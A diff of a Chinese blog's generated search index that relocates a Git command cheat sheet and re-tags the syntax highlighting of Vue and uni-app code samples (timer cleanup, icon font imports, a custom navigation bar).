@@ -34,6 +34,106 @@
       </tags>
   </entry>
   <entry>
+    <title>Git使用总结</title>
+    <url>/20200907/035321.html</url>
+    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><blockquote>
+<p>Git 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目，在这里做一下Git使用的总结。</p>
+</blockquote>
+<a id="more"></a>
+
+<h4 id="1、文档查询"><a href="#1、文档查询" class="headerlink" title="1、文档查询"></a>1、文档查询</h4><ul>
+<li><code>git help (--help)</code>    一一 展示Git命令大纲</li>
+<li><code>git help -a</code>    一一 展示Git命令大纲全部列表</li>
+<li><code>git help &lt;command&gt;</code>    一一 展示具体命令说明手册</li>
+</ul>
+<h4 id="2、配置命令"><a href="#2、配置命令" class="headerlink" title="2、配置命令"></a>2、配置命令</h4><ul>
+<li><code>git config list</code>    一一 列出当前配置</li>
+<li><code>git config --local --list</code>    一一 列出仓库设置</li>
+<li><code>git config --global --list</code>    一一 列出全局配置</li>
+<li><code>git config --system --list</code>    一一 列出系统配置</li>
+<li><code>git config --global user.name</code>    一一 配置用户名</li>
+<li><code>git config  --global user.email</code>    一一 配置用户邮箱</li>
+</ul>
+<h4 id="3、分支管理"><a href="#3、分支管理" class="headerlink" title="3、分支管理"></a>3、分支管理</h4><ul>
+<li><code>git branch</code>    一一 查看本地分支</li>
+<li><code>git branch -r</code>    一一 查看远程分支</li>
+<li><code>git branch -a</code>    一一 查看本地和远程分支</li>
+<li><code>git checkout &lt;branch-name&gt;</code>    一一 从当前分支切换到其他分支</li>
+<li><code>git checkout -b &lt;branch-name&gt;</code>    一一 创建并切换到新建分支</li>
+<li><code>git branch -d &lt;branch-name&gt;</code>    一一 删除分支</li>
+<li><code>git merge &lt;branch-name&gt;</code>    一一 当前分支与指定分支合并</li>
+<li><code>git branch --merged</code>    一一 查看哪些分支已经合并到当前分支</li>
+<li><code>git branch --no-merged</code>    一一 查看哪些分支没有合并到当前分支</li>
+<li><code>git branch -v</code>    一一 查看各个分支最后一个提交对象的信息</li>
+<li><code>git push origin --d &lt;branch-name&gt;</code>    一一 删除远程分支</li>
+<li><code>git branch -m &lt;oldbranch-name&gt;&lt;newbranch-name&gt;</code>    一一 重命名分支</li>
+<li><code>git checkout -b 本地分支名x origin/远程分支名x</code>    一一 拉取远程分支并创建本地分支</li>
+</ul>
+<h4 id="4、fetch指令"><a href="#4、fetch指令" class="headerlink" title="4、fetch指令"></a>4、fetch指令</h4><ul>
+<li><code>git fetch &lt;远程主机名&gt;</code>    一一 将某个远程主机的更新，全部拉取回本地</li>
+<li><code>git fetch &lt;远程主机名&gt; &lt;分支名&gt;</code>    一一 取回特定分支</li>
+<li><code>git fetch origin &lt;remote-branch-name&gt; &lt;local-branch-name&gt;</code>    一一 取回特定分支，并拉取到本地分支</li>
+</ul>
+<h4 id="5、文件暂存"><a href="#5、文件暂存" class="headerlink" title="5、文件暂存"></a>5、文件暂存</h4><ul>
+<li><code>git stash save -a &#39;message&#39;</code>    一一 添加改动到stash</li>
+<li><code>git stash drop &lt;stash@[ID]</code>    一一 删除暂存</li>
+<li><code>git stash list</code>    一一 查看stash列表</li>
+<li><code>git stash clear</code>    一一 删除全部缓存</li>
+<li><code>git stash pop &lt;stash@[ID]&gt;</code>    一一 恢复改动</li>
+<li><code>git apply &lt;stash@[ID]&gt;</code>    一一 将某个暂存取出来并保存stash列表</li>
+</ul>
+<h4 id="6、撤销相关"><a href="#6、撤销相关" class="headerlink" title="6、撤销相关"></a>6、撤销相关</h4><ul>
+<li><code>git checkout -- &lt;file&gt;</code>    一一 撤销“工作区”修改</li>
+<li><code>git reset HEAD &lt;file&gt;</code>    一一 暂存区文件撤销(不覆盖工作区)</li>
+<li><code>git reset --hard &lt;commit ID&gt;</code>    一一 版本回退</li>
+</ul>
+<h4 id="7、差异比较"><a href="#7、差异比较" class="headerlink" title="7、差异比较"></a>7、差异比较</h4><ul>
+<li><code>git diff</code>    一一 比较工作区与缓存区</li>
+<li><code>git diff --cached</code>    一一 比较缓存区与本地库最近一次commit内容</li>
+<li><code>git diff HEAD</code>    一一 比较工作区与本地最近一次commit内容</li>
+<li><code>git diff &lt;commit ID&gt; &lt;commit ID&gt;</code>    一一 比较两个commit之间的差异</li>
+</ul>
+<h4 id="8、Git文件状态"><a href="#8、Git文件状态" class="headerlink" title="8、Git文件状态"></a>8、Git文件状态</h4><p><code>git status</code>查看文件状态</p>
+<ul>
+<li><code>untracked</code>    在暂存区没有该文件</li>
+<li><code>modified</code>      文件发生了修改</li>
+</ul>
+<h4 id="9、分支管理规范"><a href="#9、分支管理规范" class="headerlink" title="9、分支管理规范"></a>9、分支管理规范</h4><ul>
+<li><code>master</code>分支<ul>
+<li>主分支，用于部署生产环境的分支，确保稳定性。</li>
+<li><code>master</code>分支一般由<code>develop</code>以及<code>hotfix</code>分支合并，任何情况下都不能直接修改代码</li>
+</ul>
+</li>
+<li><code>develop</code>分支<ul>
+<li><code>develop</code>为开发分支，通常情况下，保存最新完成及bug修复后的代码。</li>
+<li>开发新功能时，<code>feature</code>分支都是基于<code>develop</code>分支下创建的。</li>
+</ul>
+</li>
+<li><code>feature</code>分支<ul>
+<li>开发新功能，基本上以<code>develop</code>为基础创建<code>feature</code>分支。</li>
+<li>分支命名:<code>feature/</code>开头的为特性分支，命名规则:<code>feature/user_module</code>、<code>feature/cart_module</code>。</li>
+</ul>
+</li>
+<li><code>release</code>分支<ul>
+<li><code>release</code>分支为预上线分支，发布提测阶段，会以<code>release</code>分支代码为基准提测。</li>
+</ul>
+</li>
+<li><code>hotfix</code>分支<ul>
+<li>分支命名:<code>hotfix/</code>开头的为修复分支，命名规则与feature分支类似。</li>
+<li>出现bug时，需要及时修复，以<code>master</code>分支为基线，创建<code>hotfix</code>分支，修复完成后，需要合并到<code>master</code>分支和<code>develop</code>分支。</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>版本管理</category>
+      </categories>
+      <tags>
+        <tag>Git</tag>
+        <tag>版本管理</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Vue中的程序化事件监听器</title>
     <url>/20200917/085354.html</url>
     <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
@@ -47,10 +147,10 @@
 <a id="more"></a>
 
 <p>当我们在组件中初始化一些第三方库或者使用定时器的时候，通常需要在实例定义相关的变量，然后在相关的生命周期进行清理销毁。如下代码所示：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;...</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	export default &#123;</span><br><span class="line">        data: () &#x3D;&gt; &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                timer: null</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            &#x2F;&#x2F; startMethod</span><br><span class="line">            startMethod() &#123;</span><br><span class="line">                &#x2F;&#x2F; defining a Timer</span><br><span class="line">                this.timer &#x3D; setInterval(() &#x3D;&gt; &#123;</span><br><span class="line">                    &#x2F;&#x2F; do something</span><br><span class="line">                &#125;,10000)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x2F;&#x2F; beforeDestroy lifcycle -&gt; clearInterval()</span><br><span class="line">        beforeDestroy() &#123;</span><br><span class="line">            clearInterval(this.timer)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">        data: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                timer: <span class="literal">null</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            <span class="comment">// startMethod</span></span><br><span class="line">            startMethod() &#123;</span><br><span class="line">                <span class="comment">// defining a Timer</span></span><br><span class="line">                <span class="built_in">this</span>.timer = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="comment">// do something</span></span><br><span class="line">                &#125;,<span class="number">10000</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// beforeDestroy lifcycle -&gt; clearInterval()</span></span><br><span class="line">        beforeDestroy() &#123;</span><br><span class="line">            <span class="built_in">clearInterval</span>(<span class="built_in">this</span>.timer)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
 <p>其实，这时候还有第二种简单的方案，不用在实例里面特意定义一个属性，也可以在定义后马上进行相关的处理，逻辑比较集中。这方案就是使用一个<strong>程序化事件监听器</strong>来解决问题,修改上面代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;...</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	export default &#123;</span><br><span class="line">        methods: &#123;</span><br><span class="line">            &#x2F;&#x2F; startMethod</span><br><span class="line">            startMethod() &#123;</span><br><span class="line">                &#x2F;&#x2F; defining a Timer</span><br><span class="line">                const timer &#x3D; setInterval(() &#x3D;&gt; &#123;</span><br><span class="line">                    &#x2F;&#x2F; do something</span><br><span class="line">                &#125;,10000)</span><br><span class="line">                </span><br><span class="line">                &#x2F;&#x2F; use this.$once(&#39;hook:beforeDestroy&#39;,handler) to clear timer</span><br><span class="line">                this.$once(&#39;hook:beforeDestroy&#39;, () &#x3D;&gt; &#123;</span><br><span class="line">                    clearInterval(timer);</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">        methods: &#123;</span><br><span class="line">            <span class="comment">// startMethod</span></span><br><span class="line">            startMethod() &#123;</span><br><span class="line">                <span class="comment">// defining a Timer</span></span><br><span class="line">                <span class="keyword">const</span> timer = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="comment">// do something</span></span><br><span class="line">                &#125;,<span class="number">10000</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// use this.$once(&#x27;hook:beforeDestroy&#x27;,handler) to clear timer</span></span><br><span class="line">                <span class="built_in">this</span>.$once(<span class="string">&#x27;hook:beforeDestroy&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="built_in">clearInterval</span>(timer);</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
 <p>这样写的话，逻辑就比较清晰了，不需要特定的实例属性，定义的代码和清理的代码也不用独立在不同的地方。</p>
 <p><a href="https://cn.vuejs.org/v2/guide/components-edge-cases.html#%E7%A8%8B%E5%BA%8F%E5%8C%96%E7%9A%84%E4%BA%8B%E4%BB%B6%E4%BE%A6%E5%90%AC%E5%99%A8">Vue官网资料</a></p>
@@ -77,7 +177,7 @@
 <li><p>将文件拷贝到项目资源文件夹common内</p>
 </li>
 <li><p>在App.vue文件里面引用该动画库</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;App.vue</span><br><span class="line">&#x2F;&#x2F;...</span><br><span class="line">&lt;style&gt;</span><br><span class="line">	&#x2F;&#x2F;引入样式文件</span><br><span class="line">    import &#39;.&#x2F;common&#x2F;animate.css&#39;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//App.vue</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&lt;style&gt;</span><br><span class="line">	<span class="comment">//引入样式文件</span></span><br><span class="line">    <span class="keyword">import</span> <span class="string">&#x27;./common/animate.css&#x27;</span></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
 
 
 
@@ -91,7 +191,7 @@
 <li><p>将iconfont.css拷贝到资源文件夹common内</p>
 </li>
 <li><p>在App.vue中引入该样式文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">	&#x2F;&#x2F;引入字体文件</span><br><span class="line">    import &#39;.&#x2F;common&#x2F;iconfont.css&#39;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">	<span class="comment">//引入字体文件</span></span><br><span class="line">    <span class="keyword">import</span> <span class="string">&#x27;./common/iconfont.css&#x27;</span></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
 
 
 
@@ -101,7 +201,7 @@
 <li><p>打开iconfont.css文件，将里面的<code>@font-face</code>里面的url只保留base64位的数据就行。</p>
 </li>
 <li><p>使用如下:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;text class&#x3D;&quot;iconfont icon-user&quot;&gt;&lt;&#x2F;text&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;text <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;iconfont icon-user&quot;</span>&gt;&lt;/text&gt;</span><br></pre></td></tr></table></figure>
 
 
 
@@ -208,13 +308,13 @@
 </ul>
 <h4 id="7、自定义导航栏"><a href="#7、自定义导航栏" class="headerlink" title="7、自定义导航栏"></a>7、自定义导航栏</h4><ul>
 <li><p><code>custom-navbar.vue</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;view&gt;</span><br><span class="line">		&lt;view class&#x3D;&quot;custom-bar&quot;&gt;</span><br><span class="line">			&lt;!-- #ifdef APP-PLUS --&gt;</span><br><span class="line">			&lt;view class&#x3D;&quot;status-bar&quot; :style&#x3D;&quot;&#123;height:statusBarHeight+&#39;px&#39;&#125;&quot;&gt;&lt;&#x2F;view&gt;</span><br><span class="line">			&lt;!-- #endif --&gt;</span><br><span class="line">			&lt;view class&#x3D;&quot;nav-bar&quot;&gt;</span><br><span class="line">				最新</span><br><span class="line">			&lt;&#x2F;view&gt;</span><br><span class="line">		&lt;&#x2F;view&gt;</span><br><span class="line">		&lt;!-- 占位 --&gt;</span><br><span class="line">		&lt;view :style&#x3D;&quot;&#123;height:navBarHeight+&#39;px&#39;&#125;&quot;&gt;&lt;&#x2F;view&gt;</span><br><span class="line">	&lt;&#x2F;view&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	export default &#123;</span><br><span class="line">		data() &#123;</span><br><span class="line">			return &#123;</span><br><span class="line">				navBarHeight:0,</span><br><span class="line">				statusBarHeight:0</span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;,</span><br><span class="line">		mounted() &#123;</span><br><span class="line">			this.navBarHeight&#x3D;uni.upx2px(100);</span><br><span class="line">			&#x2F;&#x2F; #ifdef APP-PLUS</span><br><span class="line">			this.statusBarHeight&#x3D;plus.navigator.getStatusbarHeight();</span><br><span class="line">			this.navBarHeight&#x3D;this.statusBarHeight+uni.upx2px(100);</span><br><span class="line">			&#x2F;&#x2F; #endif</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang&#x3D;&quot;scss&quot;&gt;</span><br><span class="line">	.custom-bar&#123;</span><br><span class="line">		position:fixed;</span><br><span class="line">		left:0;</span><br><span class="line">		right:0;</span><br><span class="line">		top:0;</span><br><span class="line">	&#125;</span><br><span class="line">	.status-bar&#123;</span><br><span class="line">		background:#06A0D6;</span><br><span class="line">	&#125;</span><br><span class="line">	.nav-bar&#123;</span><br><span class="line">		height:100rpx;</span><br><span class="line">		font-size:41.66rpx;</span><br><span class="line">		color:#FFF;</span><br><span class="line">		background:#06a0d6;</span><br><span class="line">		line-height:100rpx;</span><br><span class="line">		text-align:center;</span><br><span class="line">		background:blue;</span><br><span class="line">	&#125;</span><br><span class="line">	.nav-pad&#123;</span><br><span class="line">		height:100rpx;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;view&gt;</span><br><span class="line">		&lt;view <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;custom-bar&quot;</span>&gt;</span><br><span class="line">			&lt;!-- #ifdef APP-PLUS --&gt;</span><br><span class="line">			&lt;view <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;status-bar&quot;</span> :style=<span class="string">&quot;&#123;height:statusBarHeight+&#x27;px&#x27;&#125;&quot;</span>&gt;&lt;/view&gt;</span><br><span class="line">			&lt;!-- #endif --&gt;</span><br><span class="line">			&lt;view <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;nav-bar&quot;</span>&gt;</span><br><span class="line">				最新</span><br><span class="line">			&lt;/view&gt;</span><br><span class="line">		&lt;/view&gt;</span><br><span class="line">		&lt;!-- 占位 --&gt;</span><br><span class="line">		&lt;view :style=<span class="string">&quot;&#123;height:navBarHeight+&#x27;px&#x27;&#125;&quot;</span>&gt;&lt;/view&gt;</span><br><span class="line">	&lt;/view&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">		data() &#123;</span><br><span class="line">			<span class="keyword">return</span> &#123;</span><br><span class="line">				navBarHeight:<span class="number">0</span>,</span><br><span class="line">				statusBarHeight:<span class="number">0</span></span><br><span class="line">			&#125;;</span><br><span class="line">		&#125;,</span><br><span class="line">		mounted() &#123;</span><br><span class="line">			<span class="built_in">this</span>.navBarHeight=uni.upx2px(<span class="number">100</span>);</span><br><span class="line">			<span class="comment">// #ifdef APP-PLUS</span></span><br><span class="line">			<span class="built_in">this</span>.statusBarHeight=plus.navigator.getStatusbarHeight();</span><br><span class="line">			<span class="built_in">this</span>.navBarHeight=<span class="built_in">this</span>.statusBarHeight+uni.upx2px(<span class="number">100</span>);</span><br><span class="line">			<span class="comment">// #endif</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=<span class="string">&quot;scss&quot;</span>&gt;</span><br><span class="line">	.custom-bar&#123;</span><br><span class="line">		position:fixed;</span><br><span class="line">		left:<span class="number">0</span>;</span><br><span class="line">		right:<span class="number">0</span>;</span><br><span class="line">		top:<span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	.status-bar&#123;</span><br><span class="line">		background:#06A0D6;</span><br><span class="line">	&#125;</span><br><span class="line">	.nav-bar&#123;</span><br><span class="line">		height:<span class="number">100</span>rpx;</span><br><span class="line">		font-size:<span class="number">41.66</span>rpx;</span><br><span class="line">		color:#FFF;</span><br><span class="line">		background:#06a0d6;</span><br><span class="line">		line-height:<span class="number">100</span>rpx;</span><br><span class="line">		text-align:center;</span><br><span class="line">		background:blue;</span><br><span class="line">	&#125;</span><br><span class="line">	.nav-pad&#123;</span><br><span class="line">		height:<span class="number">100</span>rpx;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 </li>
 <li><p><code>index.vue</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;view&gt;</span><br><span class="line">		&lt;custom-navbar ref&#x3D;&#39;custombar&#39;&gt;&lt;&#x2F;custom-navbar&gt;</span><br><span class="line">		&lt;!-- 筛选框 --&gt;</span><br><span class="line">		&lt;view class&#x3D;&quot;filter-box&quot; :style&#x3D;&quot;&#123;top:filterBoxTop+&#39;px&#39;&#125;&quot;&gt;&lt;&#x2F;view&gt;</span><br><span class="line">		&lt;view class&#x3D;&quot;select-time&quot; :style&#x3D;&quot;&#123;top:timeSelectTop+&#39;px&#39;&#125;&quot;&gt;&lt;&#x2F;view&gt;</span><br><span class="line">		&lt;view class&#x3D;&quot;pad&quot;&gt;&lt;&#x2F;view&gt;</span><br><span class="line">		&lt;view class&#x3D;&quot;content&quot;&gt;</span><br><span class="line">			&lt;view class&#x3D;&quot;item&quot; v-for&#x3D;&quot;(item,index) in 100&quot; :Key&#x3D;&quot;index&quot;&gt;</span><br><span class="line">				&#123;&#123;index+1&#125;&#125;</span><br><span class="line">			&lt;&#x2F;view&gt;</span><br><span class="line">		&lt;&#x2F;view&gt;</span><br><span class="line">	&lt;&#x2F;view&gt;</span><br><span class="line">&lt;&#x2F;template&gt;	</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	export default &#123;</span><br><span class="line">		data() &#123;</span><br><span class="line">			return &#123;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;,</span><br><span class="line">		methods: &#123;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang&#x3D;&quot;scss&quot;&gt;</span><br><span class="line">.filter-box&#123;</span><br><span class="line">	position:fixed;</span><br><span class="line">	left:0;</span><br><span class="line">	right:0;</span><br><span class="line">	height:100rpx;</span><br><span class="line">	background:yellow;</span><br><span class="line">	z-index:10;</span><br><span class="line">&#125;</span><br><span class="line">.select-time&#123;</span><br><span class="line">	position: fixed;</span><br><span class="line">	left:0;</span><br><span class="line">	right:0;</span><br><span class="line">	height:85.41rpx;</span><br><span class="line">	background:orange;</span><br><span class="line">	z-index:10;</span><br><span class="line">&#125;</span><br><span class="line">.pad&#123;</span><br><span class="line">	height:185.41rpx;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;view&gt;</span><br><span class="line">		&lt;custom-navbar ref=<span class="string">&#x27;custombar&#x27;</span>&gt;&lt;/custom-navbar&gt;</span><br><span class="line">		&lt;!-- 筛选框 --&gt;</span><br><span class="line">		&lt;view <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;filter-box&quot;</span> :style=<span class="string">&quot;&#123;top:filterBoxTop+&#x27;px&#x27;&#125;&quot;</span>&gt;&lt;/view&gt;</span><br><span class="line">		&lt;view <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;select-time&quot;</span> :style=<span class="string">&quot;&#123;top:timeSelectTop+&#x27;px&#x27;&#125;&quot;</span>&gt;&lt;/view&gt;</span><br><span class="line">		&lt;view <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;pad&quot;</span>&gt;&lt;/view&gt;</span><br><span class="line">		&lt;view <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;content&quot;</span>&gt;</span><br><span class="line">			&lt;view <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;item&quot;</span> v-<span class="keyword">for</span>=<span class="string">&quot;(item,index) in 100&quot;</span> :Key=<span class="string">&quot;index&quot;</span>&gt;</span><br><span class="line">				&#123;&#123;index+<span class="number">1</span>&#125;&#125;</span><br><span class="line">			&lt;/view&gt;</span><br><span class="line">		&lt;/view&gt;</span><br><span class="line">	&lt;/view&gt;</span><br><span class="line">&lt;/template&gt;	</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">		data() &#123;</span><br><span class="line">			<span class="keyword">return</span> &#123;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;,</span><br><span class="line">		methods: &#123;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=<span class="string">&quot;scss&quot;</span>&gt;</span><br><span class="line">.filter-box&#123;</span><br><span class="line">	position:fixed;</span><br><span class="line">	left:<span class="number">0</span>;</span><br><span class="line">	right:<span class="number">0</span>;</span><br><span class="line">	height:<span class="number">100</span>rpx;</span><br><span class="line">	background:yellow;</span><br><span class="line">	z-index:<span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">.select-time&#123;</span><br><span class="line">	position: fixed;</span><br><span class="line">	left:<span class="number">0</span>;</span><br><span class="line">	right:<span class="number">0</span>;</span><br><span class="line">	height:<span class="number">85.41</span>rpx;</span><br><span class="line">	background:orange;</span><br><span class="line">	z-index:<span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">.pad&#123;</span><br><span class="line">	height:<span class="number">185.41</span>rpx;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>navbar.mixin</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export default&#123;</span><br><span class="line">	data()&#123;</span><br><span class="line">		return &#123;</span><br><span class="line">			filterBoxTop:0,</span><br><span class="line">			timeSelectTop:0</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;,</span><br><span class="line">	mounted()&#123;</span><br><span class="line">		if(this.$refs[&#39;custombar&#39;])&#123;</span><br><span class="line">			this.filterBoxTop&#x3D;this.$refs[&#39;custombar&#39;].navBarHeight;</span><br><span class="line">			this.timeSelectTop&#x3D;this.filterBoxTop+uni.upx2px(85.41);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line">	data()&#123;</span><br><span class="line">		<span class="keyword">return</span> &#123;</span><br><span class="line">			filterBoxTop:<span class="number">0</span>,</span><br><span class="line">			timeSelectTop:<span class="number">0</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;,</span><br><span class="line">	mounted()&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">this</span>.$refs[<span class="string">&#x27;custombar&#x27;</span>])&#123;</span><br><span class="line">			<span class="built_in">this</span>.filterBoxTop=<span class="built_in">this</span>.$refs[<span class="string">&#x27;custombar&#x27;</span>].navBarHeight;</span><br><span class="line">			<span class="built_in">this</span>.timeSelectTop=<span class="built_in">this</span>.filterBoxTop+uni.upx2px(<span class="number">85.41</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
@@ -264,106 +364,6 @@
         <tag>uni-app</tag>
         <tag>app</tag>
         <tag>跨平台</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Git使用总结</title>
-    <url>/20200907/035321.html</url>
-    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><blockquote>
-<p>Git 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目，在这里做一下Git使用的总结。</p>
-</blockquote>
-<a id="more"></a>
-
-<h4 id="1、文档查询"><a href="#1、文档查询" class="headerlink" title="1、文档查询"></a>1、文档查询</h4><ul>
-<li><code>git help (--help)</code>    一一 展示Git命令大纲</li>
-<li><code>git help -a</code>    一一 展示Git命令大纲全部列表</li>
-<li><code>git help &lt;command&gt;</code>    一一 展示具体命令说明手册</li>
-</ul>
-<h4 id="2、配置命令"><a href="#2、配置命令" class="headerlink" title="2、配置命令"></a>2、配置命令</h4><ul>
-<li><code>git config list</code>    一一 列出当前配置</li>
-<li><code>git config --local --list</code>    一一 列出仓库设置</li>
-<li><code>git config --global --list</code>    一一 列出全局配置</li>
-<li><code>git config --system --list</code>    一一 列出系统配置</li>
-<li><code>git config --global user.name</code>    一一 配置用户名</li>
-<li><code>git config  --global user.email</code>    一一 配置用户邮箱</li>
-</ul>
-<h4 id="3、分支管理"><a href="#3、分支管理" class="headerlink" title="3、分支管理"></a>3、分支管理</h4><ul>
-<li><code>git branch</code>    一一 查看本地分支</li>
-<li><code>git branch -r</code>    一一 查看远程分支</li>
-<li><code>git branch -a</code>    一一 查看本地和远程分支</li>
-<li><code>git checkout &lt;branch-name&gt;</code>    一一 从当前分支切换到其他分支</li>
-<li><code>git checkout -b &lt;branch-name&gt;</code>    一一 创建并切换到新建分支</li>
-<li><code>git branch -d &lt;branch-name&gt;</code>    一一 删除分支</li>
-<li><code>git merge &lt;branch-name&gt;</code>    一一 当前分支与指定分支合并</li>
-<li><code>git branch --merged</code>    一一 查看哪些分支已经合并到当前分支</li>
-<li><code>git branch --no-merged</code>    一一 查看哪些分支没有合并到当前分支</li>
-<li><code>git branch -v</code>    一一 查看各个分支最后一个提交对象的信息</li>
-<li><code>git push origin --d &lt;branch-name&gt;</code>    一一 删除远程分支</li>
-<li><code>git branch -m &lt;oldbranch-name&gt;&lt;newbranch-name&gt;</code>    一一 重命名分支</li>
